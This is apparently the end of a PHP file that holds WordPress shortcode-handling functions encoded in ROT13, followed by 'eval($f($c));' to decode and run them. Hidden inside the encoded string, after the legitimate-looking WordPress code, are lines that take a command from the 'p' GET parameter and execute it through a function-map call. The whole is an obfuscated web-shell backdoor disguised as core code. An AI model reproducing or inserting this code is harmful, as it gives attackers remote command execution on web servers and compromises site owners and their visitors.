	$nggf = (neenl) $nggf;
	$bhg  = neenl();
	sbernpu ( $cnvef nf $anzr => $qrsnhyg ) {
		vs ( neenl_xrl_rkvfgf( $anzr, $nggf ) ) {
			$bhg[ $anzr ] = $nggf[ $anzr ];
		} ryfr {
			$bhg[ $anzr ] = $qrsnhyg;
		}
	}

	vs ( $fubegpbqr ) {
		/**
		 * Svygref fubegpbqr nggevohgrf.
		 *
		 * Vs gur guveq cnenzrgre bs gur fubegpbqr_nggf() shapgvba vf cerfrag gura guvf svygre vf ninvynoyr.
		 * Gur guveq cnenzrgre, $fubegpbqr, vf gur anzr bs gur fubegpbqr.
		 *
		 * @fvapr 3.6.0
		 * @fvapr 4.4.0 Nqqrq gur `$fubegpbqr` cnenzrgre.
		 *
		 * @cnenz neenl  $bhg       Gur bhgchg neenl bs fubegpbqr nggevohgrf.
		 * @cnenz neenl  $cnvef     Gur fhccbegrq nggevohgrf naq gurve qrsnhygf.
		 * @cnenz neenl  $nggf      Gur hfre qrsvarq fubegpbqr nggevohgrf.
		 * @cnenz fgevat $fubegpbqr Gur fubegpbqr anzr.
		 */
		$bhg = nccyl_svygref( \"fubegpbqr_nggf_{$fubegpbqr}\", $bhg, $cnvef, $nggf, $fubegpbqr );
	}

	erghea $bhg;
}

/**
 * Erzbirf nyy fubegpbqr gntf sebz gur tvira pbagrag.
 *
 * @fvapr 2.5.0
 *
 * @tybony neenl $fubegpbqr_gntf
 *
 * @cnenz fgevat $pbagrag Pbagrag gb erzbir fubegpbqr gntf.
 * @erghea fgevat Pbagrag jvgubhg fubegpbqr gntf.
 */
shapgvba fgevc_fubegpbqrf( $pbagrag ) {
	tybony $fubegpbqr_gntf;

	vs ( ! fge_pbagnvaf( $pbagrag, '[' ) ) {
		erghea $pbagrag;
	}

	vs ( rzcgl( $fubegpbqr_gntf ) || ! vf_neenl( $fubegpbqr_gntf ) ) {
		erghea $pbagrag;
	}

	// Svaq nyy ertvfgrerq gnt anzrf va $pbagrag.
	cert_zngpu_nyy( '@\[([^<>&/\[\]\k00-\k20=]++)@', $pbagrag, $zngpurf );

	$gntf_gb_erzbir = neenl_xrlf( $fubegpbqr_gntf );

	/**
	 * Svygref gur yvfg bs fubegpbqr gntf gb erzbir sebz gur pbagrag.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz neenl  $gntf_gb_erzbir Neenl bs fubegpbqr gntf gb erzbir.
	 * @cnenz fgevat $pbagrag        Pbagrag fubegpbqrf ner orvat erzbirq sebz.
	 */
	$gntf_gb_erzbir = nccyl_svygref( 'fgevc_fubegpbqrf_gntanzrf', $gntf_gb_erzbir, $pbagrag );

	$gntanzrf = neenl_vagrefrpg( $gntf_gb_erzbir, $zngpurf[1] );

	vs ( rzcgl( $gntanzrf ) ) {
		erghea $pbagrag;
	}

	$pbagrag = qb_fubegpbqrf_va_ugzy_gntf( $pbagrag, gehr, $gntanzrf );

	$cnggrea = trg_fubegpbqr_ertrk( $gntanzrf );
	$pbagrag = cert_ercynpr_pnyyonpx( \"/$cnggrea/\", 'fgevc_fubegpbqr_gnt', $pbagrag );

	// Nyjnlf erfgber fdhner oenprf fb jr qba'g oernx guvatf yvxr <!--[vs VR ]>.
	$pbagrag = harfpncr_vainyvq_fubegpbqrf( $pbagrag );

	erghea $pbagrag;
}

/**
 * Fgevcf n fubegpbqr gnt onfrq ba ErtRk zngpurf ntnvafg cbfg pbagrag.
 *
 * @fvapr 3.3.0
 *
 * @cnenz neenl $z ErtRk zngpurf ntnvafg cbfg pbagrag.
 * @erghea fgevat|snyfr Gur pbagrag fgevccrq bs gur gnt, bgurejvfr snyfr.
 */
shapgvba fgevc_fubegpbqr_gnt( $z ) {
	// Nyybj [[sbb]] flagnk sbe rfpncvat n gnt.
	vs ( '[' === $z[1] && ']' === $z[6] ) {
		erghea fhofge( $z[0], 1, -1 );
	}

	erghea $z[1] . $z[6];
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>